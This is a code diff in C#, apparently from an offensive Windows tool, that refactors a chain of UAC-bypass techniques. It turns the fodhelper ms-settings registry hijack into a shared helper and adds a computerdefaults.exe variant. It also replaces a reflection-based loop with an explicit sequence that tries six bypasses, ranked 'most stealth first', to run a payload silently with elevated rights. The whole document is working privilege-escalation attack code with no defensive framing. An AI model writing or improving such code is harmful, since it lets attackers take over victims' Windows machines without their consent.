@@ -386,6 +386,16 @@ cmd.exe /c """ + batchPath + @"""
 
         public static bool FodhelperBypass(string payloadPath)
         {
+            return SettingsHijackBypass("fodhelper.exe", payloadPath);
+        }
+
+        public static bool ComputerDefaultsBypass(string payloadPath)
+        {
+            return SettingsHijackBypass("computerdefaults.exe", payloadPath);
+        }
+
+        private static bool SettingsHijackBypass(string targetExe, string payloadPath)
+        {
             try
             {
                 string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
@@ -400,7 +410,7 @@ cmd.exe /c """ + batchPath + @"""
                 
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
-                    FileName = "fodhelper.exe",
+                    FileName = targetExe,
                     UseShellExecute = true,
                     WindowStyle = ProcessWindowStyle.Hidden,
                     CreateNoWindow = true
@@ -506,36 +516,30 @@ cmd.exe /c """ + batchPath + @"""
                 return true;
             }
 
-            // Priority order (most stealth first)
-            var techniques = new List<Func<string, bool>>
-            (
-                new Func<string, bool>[] {
-                    FodhelperBypass,
-                    SilentCleanupBypass,
-                    CmstpBypass,
-                    SdcltBypass,
-                    CmluaUtilBypass
-                }
-            );
-
-            foreach (var technique in techniques)
+            // Priority order (most stealth first) - Rewritten without Reflection (AOT Compatible)
+            try
             {
-                try
-                {
-                    Log(string.Format("Attempting technique: {0}", technique.Method.Name));
-                    if (technique(payloadPath))
-                    {
-                        Log(string.Format("Technique {0} returned true", technique.Method.Name));
-                        // Small delay to ensure execution
-                        Thread.Sleep(1000);
-                        return true;
-                    }
-                    Log(string.Format("Technique {0} returned false", technique.Method.Name));
-                }
-                catch (Exception ex)
-                {
-                    Log(string.Format("Technique {0} crashed: {1}", technique.Method.Name, ex.Message));
-                }
+                Log("Attempting technique: ComputerDefaultsBypass");
+                if (ComputerDefaultsBypass(payloadPath)) return true;
+
+                Log("Attempting technique: FodhelperBypass");
+                if (FodhelperBypass(payloadPath)) return true;
+
+                Log("Attempting technique: SilentCleanupBypass");
+                if (SilentCleanupBypass(payloadPath)) return true;
+
+                Log("Attempting technique: CmstpBypass");
+                if (CmstpBypass(payloadPath)) return true;
+
+                Log("Attempting technique: SdcltBypass");
+                if (SdcltBypass(payloadPath)) return true;
+
+                Log("Attempting technique: CmluaUtilBypass");
+                if (CmluaUtilBypass(payloadPath)) return true;
+            }
+            catch (Exception ex)
+            {
+                Log($"Bypass chain error: {ex.Message}");
             }
 
             // Final fallback: request UAC elevation
